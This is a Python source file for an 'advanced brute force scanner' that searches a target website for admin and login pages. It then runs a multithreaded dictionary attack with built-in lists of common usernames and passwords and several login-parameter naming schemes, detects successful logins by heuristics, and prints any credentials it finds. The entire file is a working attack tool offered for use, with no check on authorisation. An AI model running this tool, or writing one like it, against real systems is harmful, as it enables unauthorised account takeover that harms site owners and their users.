import time
import threading
import queue
import random
import sys
from colorama import Fore, Style, Back, init
from datetime import datetime

# Initialize colorama for cross-platform colored terminal
init(autoreset=True)

class BruteForceScanner:
    def __init__(self):
        self.name = "🔐 ADVANCED BRUTE FORCE SCANNER"
        self.version = "3.0"
        self.author = "Security Team"
        
        # Color scheme definition
        self.colors = {
            'info': Fore.CYAN + Style.BRIGHT,
            'success': Fore.GREEN + Style.BRIGHT,
            'warning': Fore.YELLOW + Style.BRIGHT,
            'error': Fore.RED + Style.BRIGHT,
            'critical': Back.RED + Fore.WHITE + Style.BRIGHT,
            'highlight': Fore.MAGENTA + Style.BRIGHT,
            'scanning': Fore.BLUE + Style.BRIGHT,
            'credential': Fore.RED + Back.BLACK + Style.BRIGHT,
            'progress': Fore.YELLOW + Style.NORMAL,
            'banner': Fore.MAGENTA + Style.BRIGHT,
            'header': Fore.WHITE + Style.BRIGHT,
            'data': Fore.CYAN + Style.NORMAL,
            'timestamp': Fore.LIGHTBLACK_EX
        }
        
        # Extended common usernames
        self.common_usernames = [
            'admin', 'administrator', 'root', 'user', 'test',
            'guest', 'admin123', 'superuser', 'manager', 'system',
            'operator', 'webadmin', 'sysadmin', 'dbadmin', 'server',
            'support', 'tech', 'info', 'webmaster', 'hostmaster',
            'postmaster', 'noreply', 'security', 'backup', 'demo'
        ]
        
        # Extended common passwords
        self.common_passwords = [
            'admin', 'admin123', 'password', '123456', 'password123',
            '12345678', '123456789', 'qwerty', 'abc123', 'letmein',
            'welcome', 'monkey', 'password1', '1234567', 'sunshine',
            'master', 'hello', 'freedom', 'whatever', 'qazwsx',
            '123123', '12345', '1234', '111111', '123abc',
            'administrator', 'root', 'toor', 'pass', 'pass123',
            'secret', 'test', 'test123', 'changeme', 'default',
            '123qwe', 'qwerty123', '1q2w3e', '1q2w3e4r', '1qaz2wsx'
        ]
        
        # Common login parameters
        self.login_params = [
            ('username', 'password'),
            ('user', 'pass'),
            ('email', 'password'),
            ('login', 'password'),
            ('usr', 'pwd'),
            ('uname', 'passwd'),
            ('u', 'p'),
            ('auth_user', 'auth_pass')
        ]
        
        self.max_threads = 10
        self.timeout = 15
        self.delay_between_requests = 0.3
        self.scanning_active = False
        self.total_tested = 0
        self.found_credentials = []
        
        # Login success indicators
        self.success_indicators = [
            'logout', 'Logout', 'LOGOUT',
            'dashboard', 'Dashboard', 'DASHBOARD',
            'welcome', 'Welcome', 'WELCOME',
            'successfully', 'Successfully', 'SUCCESSFULLY',
            'my account', 'My Account', 'MY ACCOUNT',
            'profile', 'Profile', 'PROFILE',
            'home', 'Home', 'HOME',
            'main', 'Main', 'MAIN',
            'console', 'Console', 'CONSOLE',
            'panel', 'Panel', 'PANEL'
        ]
        
        # Login failure indicators
        self.failure_indicators = [
            'invalid', 'Invalid', 'INVALID',
            'incorrect', 'Incorrect', 'INCORRECT',
            'failed', 'Failed', 'FAILED',
            'error', 'Error', 'ERROR',
            'try again', 'Try Again', 'TRY AGAIN',
            'wrong', 'Wrong', 'WRONG',
            'access denied', 'Access Denied', 'ACCESS DENIED'
        ]

    def print_banner(self):
        """Display enhanced banner"""
        banner = f"""
{self.colors['banner']}{"="*70}
{self.colors['header']}╔══════════════════════════════════════════════════════════╗
║ {self.colors['banner']}{self.name:^58} {self.colors['header']}║
║ {self.colors['data']}Version: {self.version:^50} {self.colors['header']}║
║ {self.colors['data']}Author: {self.author:^50} {self.colors['header']}║
╚══════════════════════════════════════════════════════════╝
{self.colors['banner']}{"="*70}
"""
        print(banner)

    def print_status(self, message, level="info"):
        """Print colored status messages with timestamp"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        prefix = {
            "info": f"{self.colors['info']}[*]",
            "success": f"{self.colors['success']}[+]",
            "warning": f"{self.colors['warning']}[!]",
            "error": f"{self.colors['error']}[-]",
            "critical": f"{self.colors['critical']}[CRITICAL]"
        }.get(level, f"{self.colors['info']}[*]")
        
        print(f"{self.colors['timestamp']}[{timestamp}] {prefix}{Style.RESET_ALL} {message}")

    def scan(self, target, options=None):
        """Perform comprehensive brute force scanning"""
        self.print_banner()
        
        results = {
            'target': target,
            'credentials_found': [],
            'login_pages_found': [],
            'tested_combinations': 0,
            'start_time': time.time(),
            'end_time': None,
            'status': 'completed'
        }
        
        self.print_status(f"Initiating scan on target: {self.colors['highlight']}{target}", "info")
        self.print_status(f"Maximum threads: {self.max_threads}", "info")
        self.print_status(f"Delay between requests: {self.delay_between_requests}s", "info")
        
        try:
            # Discover login pages
            login_pages = self.discover_login_pages(target)
            results['login_pages_found'] = login_pages
            
            if not login_pages:
                self.print_status("No login pages found", "warning")
                return results
            
            # Test each discovered login page
            for login_url in login_pages:
                self.print_status(f"Testing login page: {self.colors['scanning']}{login_url}", "info")
                
                # Test default credentials
                credentials = self.test_default_credentials(login_url)
                if credentials:
                    results['credentials_found'].extend(credentials)
                    self.found_credentials.extend(credentials)
                
                # Test common credentials dictionary
                self.print_status("Starting dictionary attack...", "info")
                dict_credentials = self.dictionary_attack(login_url)
                if dict_credentials:
                    results['credentials_found'].extend(dict_credentials)
                    self.found_credentials.extend(dict_credentials)
                
                time.sleep(1)  # Delay between testing different pages
            
            results['tested_combinations'] = self.total_tested
            results['end_time'] = time.time()
            results['duration'] = results['end_time'] - results['start_time']
            
            # Print summary
            self.print_summary(results)
            
            return results
            
        except Exception as e:
            self.print_status(f"Scan error: {str(e)}", "error")
            results['status'] = 'failed'
            results['error'] = str(e)
            return results

    def discover_login_pages(self, target):
        """Discover potential login pages"""
        login_endpoints = [
            '/admin/login', '/admin', '/administrator', '/wp-login.php',
            '/login', '/auth/login', '/signin', '/user/login', '/dashboard',
            '/controlpanel', '/cp', '/adminpanel', '/admincp', '/backend',
            '/manager', '/webadmin', '/sysadmin', '/account/login',
            '/sign-in', '/member/login', '/secure', '/auth', '/authentication',
            '/admin/index.php', '/admin/login.php', '/admin/admin.php',
            '/admin_area', '/admin1', '/admin2', '/admin/login.aspx',
            '/admin/admin.asp', '/admin/account.aspx', '/admin_area/login'
        ]
        
        login_pages = []
        from utils.request_wrapper import RequestWrapper
        req = RequestWrapper()
        
        self.print_status(f"Discovering login pages...", "info")
        
        for endpoint in login_endpoints:
            login_url = f"{target.rstrip('/')}{endpoint}"
            
            try:
                response = req.get(login_url, timeout=self.timeout)
                
                if response.status_code == 200:
                    # Check if page contains login indicators
                    if self.is_login_page(response.text):
                        login_pages.append(login_url)
                        self.print_status(f"Found login page: {self.colors['success']}{login_url}", "success")
                
                elif response.status_code in [301, 302, 307, 308]:
                    redirect_url = response.headers.get('Location', '')
                    self.print_status(f"Redirect detected: {login_url} -> {redirect_url}", "warning")
                
                time.sleep(self.delay_between_requests)
                
            except Exception as e:
                continue
        
        return login_pages

    def is_login_page(self, content):
        """Check if content appears to be a login page"""
        login_indicators = [
            '<input type="password"',
            'name="password"',
            'id="password"',
            'type="password"',
            'login form',
            'sign in',
            'log in',
            'password:',
            'Password:'
        ]
        
        content_lower = content.lower()
        matches = sum(1 for indicator in login_indicators if indicator.lower() in content_lower)
        return matches >= 2

    def test_default_credentials(self, login_url):
        """Test default credential pairs"""
        credentials_found = []
        
        from utils.request_wrapper import RequestWrapper
        req = RequestWrapper()
        
        self.print_status(f"Testing default credentials...", "info")
        
        # Test common credential pairs
        common_pairs = [
            ('admin', 'admin'),
            ('admin', 'admin123'),
            ('admin', 'password'),
            ('administrator', 'administrator'),
            ('root', 'root'),
            ('test', 'test'),
            ('guest', 'guest'),
            ('admin', '123456'),
            ('admin', 'password123'),
            ('administrator', 'password'),
            ('root', 'toor'),
            ('admin', 'admin@123'),
            ('superuser', 'superuser')
        ]
        
        for i, (username, password) in enumerate(common_pairs, 1):
            try:
                self.print_status(f"Testing: {self.colors['data']}{username}:{password}", "progress")
                
                # Try different parameter combinations
                for user_param, pass_param in self.login_params:
                    data = {user_param: username, pass_param: password}
                    
                    response = req.post(login_url, data=data, timeout=self.timeout)
                    
                    if self.is_login_successful(response):
                        creds = {
                            'url': login_url,
                            'username': username,
                            'password': password,
                            'parameters_used': (user_param, pass_param),
                            'method': 'POST',
                            'timestamp': datetime.now().isoformat()
                        }
                        credentials_found.append(creds)
                        
                        self.print_status(
                            f"{self.colors['credential']}CREDENTIALS FOUND: {username}:{password}",
                            "critical"
                        )
                        self.print_status(f"Parameters: {user_param}/{pass_param}", "success")
                        break
                
                self.total_tested += 1
                time.sleep(self.delay_between_requests)
                
            except Exception as e:
                continue
        
        return credentials_found

    def dictionary_attack(self, login_url):
        """Perform dictionary attack with threading"""
        self.scanning_active = True
        credentials_found = []
        work_queue = queue.Queue()
        results_queue = queue.Queue()
        
        # Create work items (username, password pairs)
        for username in self.common_usernames:
            for password in self.common_passwords:
                work_queue.put((username, password))
        
        total_combinations = len(self.common_usernames) * len(self.common_passwords)
        self.print_status(f"Total combinations to test: {total_combinations}", "info")
        
        # Create and start worker threads
        threads = []
        for i in range(min(self.max_threads, total_combinations)):
            thread = threading.Thread(
                target=self._worker,
                args=(login_url, work_queue, results_queue, i)
            )
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        # Monitor progress
        self._progress_monitor(total_combinations, results_queue)
        
        # Collect results
        while not results_queue.empty():
            result = results_queue.get()
            if result:
                credentials_found.append(result)
        
        self.scanning_active = False
        return credentials_found

    def _worker(self, login_url, work_queue, results_queue, thread_id):
        """Worker thread for dictionary attack"""
        from utils.request_wrapper import RequestWrapper
        req = RequestWrapper()
        
        while not work_queue.empty() and self.scanning_active:
            try:
                username, password = work_queue.get_nowait()
                
                # Try different parameter combinations
                for user_param, pass_param in self.login_params:
                    data = {user_param: username, pass_param: password}
                    
                    try:
                        response = req.post(login_url, data=data, timeout=self.timeout)
                        
                        if self.is_login_successful(response):
                            creds = {
                                'url': login_url,
                                'username': username,
                                'password': password,
                                'parameters_used': (user_param, pass_param),
                                'method': 'POST',
                                'thread_id': thread_id,
                                'timestamp': datetime.now().isoformat()
                            }
                            results_queue.put(creds)
                            
                            self.print_status(
                                f"{self.colors['credential']}[Thread-{thread_id}] Found: {username}:{password}",
                                "critical"
                            )
                            break
                            
                    except Exception:
                        continue
                
                self.total_tested += 1
                time.sleep(self.delay_between_requests * random.uniform(0.5, 1.5))
                
            except queue.Empty:
                break
            except Exception as e:
                continue

    def _progress_monitor(self, total_combinations, results_queue):
        """Monitor and display progress"""
        start_time = time.time()
        
        while self.scanning_active:
            tested = self.total_tested
            progress = (tested / total_combinations) * 100
            
            # Create progress bar
            bar_length = 30
            filled_length = int(bar_length * progress / 100)
            bar = f"{self.colors['success']}{'█' * filled_length}" + \
                  f"{self.colors['progress']}{'░' * (bar_length - filled_length)}"
            
            elapsed_time = time.time() - start_time
            if tested > 0:
                estimated_total = (elapsed_time / progress * 100) if progress > 0 else 0
                remaining = estimated_total - elapsed_time
                
                sys.stdout.write(f"\r{self.colors['progress']}[Progress] {bar} {progress:.1f}% | "
                               f"Tested: {tested}/{total_combinations} | "
                               f"Found: {len(self.found_credentials)} | "
                               f"Elapsed: {elapsed_time:.1f}s | "
                               f"Remaining: {remaining:.1f}s")
                sys.stdout.flush()
            
            time.sleep(0.5)

    def is_login_successful(self, response):
        """Enhanced login success detection"""
        response_text = response.text.lower()
        
        # Check for redirects (common on successful login)
        if response.status_code in [301, 302, 303, 307, 308]:
            redirect_location = response.headers.get('Location', '').lower()
            
            # Check if redirect goes to non-login page
            if 'login' not in redirect_location and 'auth' not in redirect_location:
                return True
        
        # Check for success indicators
        success_count = 0
        for indicator in self.success_indicators:
            if indicator.lower() in response_text:
                success_count += 1
        
        # Check for failure indicators
        failure_count = 0
        for indicator in self.failure_indicators:
            if indicator.lower() in response_text:
                failure_count += 1
        
        # Check for session/cookie setting
        if 'set-cookie' in response.headers:
            cookie_header = response.headers['set-cookie'].lower()
            if 'session' in cookie_header or 'auth' in cookie_header:
                success_count += 2
        
        # Decision logic
        return success_count > failure_count and success_count >= 2

    def print_summary(self, results):
        """Print comprehensive scan summary"""
        duration = results.get('duration', 0)
        
        summary = f"""
{self.colors['banner']}{"="*70}
{self.colors['header']}📊 SCAN SUMMARY
{self.colors['banner']}{"-"*70}
{self.colors['data']}Target: {results['target']}
{self.colors['data']}Status: {results['status']}
{self.colors['data']}Duration: {duration:.2f} seconds
{self.colors['data']}Login Pages Found: {len(results['login_pages_found'])}
{self.colors['data']}Credentials Tested: {results['tested_combinations']}
{self.colors['data']}Credentials Found: {len(results['credentials_found'])}
{self.colors['banner']}{"-"*70}
"""
        
        print(summary)
        
        # Display found credentials
        if results['credentials_found']:
            print(f"{self.colors['header']}🚨 DISCOVERED CREDENTIALS:")
            print(f"{self.colors['banner']}{'-'*70}")
            
            for i, creds in enumerate(results['credentials_found'], 1):
                print(f"{self.colors['highlight']}{i}. URL: {creds['url']}")
                print(f"{self.colors['success']}   Username: {creds['username']}")
                print(f"{self.colors['error']}   Password: {creds['password']}")
                print(f"{self.colors['data']}   Method: {creds.get('method', 'POST')}")
                print(f"{self.colors['data']}   Timestamp: {creds.get('timestamp', 'N/A')}")
                print(f"{self.colors['banner']}{'-'*40}")
        
        # Display login pages found
        if results['login_pages_found']:
            print(f"\n{self.colors['header']}🌐 DISCOVERED LOGIN PAGES:")
            for page in results['login_pages_found']:
                print(f"{self.colors['info']}  • {page}")
        
        print(f"\n{self.colors['success']}✅ Scan completed successfully!")
        print(f"{self.colors['banner']}{'='*70}\n")

    def load_wordlists(self, user_file=None, pass_file=None):
        """Load custom wordlists from files"""
        try:
            if user_file:
                with open(user_file, 'r') as f:
                    self.common_usernames = [line.strip() for line in f if line.strip()]
                self.print_status(f"Loaded {len(self.common_usernames)} usernames from {user_file}", "success")
            
            if pass_file:
                with open(pass_file, 'r') as f:
                    self.common_passwords = [line.strip() for line in f if line.strip()]
                self.print_status(f"Loaded {len(self.common_passwords)} passwords from {pass_file}", "success")
                
        except Exception as e:
            self.print_status(f"Failed to load wordlists: {e}", "error")

# Example usage
if __name__ == "__main__":
    scanner = BruteForceScanner()
    
    # Configure scanner
    scanner.max_threads = 8
    scanner.delay_between_requests = 0.2
    
    # Load custom wordlists (optional)
    # scanner.load_wordlists("usernames.txt", "passwords.txt")
    
    # Start scan
    target_url = "http://example.com"
    results = scanner.scan(target_url)